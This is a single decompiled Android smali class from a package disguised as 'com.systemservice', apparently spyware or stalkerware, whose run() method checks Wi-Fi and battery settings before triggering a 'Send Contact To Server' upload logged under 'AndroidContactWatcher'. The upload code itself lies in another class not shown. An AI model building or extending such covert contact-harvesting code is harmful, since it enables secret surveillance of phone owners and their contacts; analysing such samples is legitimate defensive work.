.class Lcom/systemservice/a/c/e/b;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/e/d;->a(Lcom/systemservice/a/b/a;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/systemservice/a/h/h;

.field final synthetic c:Lcom/systemservice/a/c/e/d;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/e/d;Landroid/content/Context;Lcom/systemservice/a/h/h;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/e/b;->c:Lcom/systemservice/a/c/e/d;

    iput-object p2, p0, Lcom/systemservice/a/c/e/b;->a:Landroid/content/Context;

    iput-object p3, p0, Lcom/systemservice/a/c/e/b;->b:Lcom/systemservice/a/h/h;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "LongLogTag"
        }
    .end annotation

    iget-object v0, p0, Lcom/systemservice/a/c/e/b;->a:Landroid/content/Context;

    const/4 v1, 0x0

    const-string v2, "sending_contact"

    invoke-static {v0, v2, v1}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_2

    iget-object v0, p0, Lcom/systemservice/a/c/e/b;->a:Landroid/content/Context;

    const-string v2, "app_prefs_settings"

    invoke-virtual {v0, v2, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v2, "media_data_transfered_by_wifi_only"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    const-string v3, "save_battery"

    if-eqz v2, :cond_0

    invoke-interface {v0, v3, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-nez v2, :cond_0

    const-string v2, "AndroidContactWatcher"

    const-string v4, "G_MEDIA_DATA_TRANSFERED_BY_WIFI_ONLY = true; G_SAVE_BATTERY = false"

    invoke-static {v2, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v4, p0, Lcom/systemservice/a/c/e/b;->a:Landroid/content/Context;

    invoke-static {v4}, Lcom/systemservice/a/a/h;->c(Landroid/content/Context;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v0, "WiFi ONLY = false"

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v1, p0, Lcom/systemservice/a/c/e/b;->c:Lcom/systemservice/a/c/e/d;

    invoke-static {v1}, Lcom/systemservice/a/c/e/d;->a(Lcom/systemservice/a/c/e/d;)Lorg/apache/log4j/Logger;

    move-result-object v1

    invoke-virtual {v1, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_0
    invoke-interface {v0, v3, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/systemservice/a/c/e/b;->a:Landroid/content/Context;

    invoke-static {v1}, Lcom/systemservice/a/a/h;->b(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_2

    const/4 v1, 0x1

    const-string v2, "battery"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/systemservice/a/c/e/b;->c:Lcom/systemservice/a/c/e/d;

    invoke-static {v0}, Lcom/systemservice/a/c/e/d;->a(Lcom/systemservice/a/c/e/d;)Lorg/apache/log4j/Logger;

    move-result-object v0

    const-string v1, "Send Contact To Server"

    invoke-virtual {v0, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    :cond_1
    iget-object v0, p0, Lcom/systemservice/a/c/e/b;->c:Lcom/systemservice/a/c/e/d;

    iget-object v1, p0, Lcom/systemservice/a/c/e/b;->a:Landroid/content/Context;

    iget-object v2, p0, Lcom/systemservice/a/c/e/b;->b:Lcom/systemservice/a/h/h;

    invoke-static {v0, v1, v2}, Lcom/systemservice/a/c/e/d;->a(Lcom/systemservice/a/c/e/d;Landroid/content/Context;Lcom/systemservice/a/h/h;)V

    :cond_2
    return-void
.end method
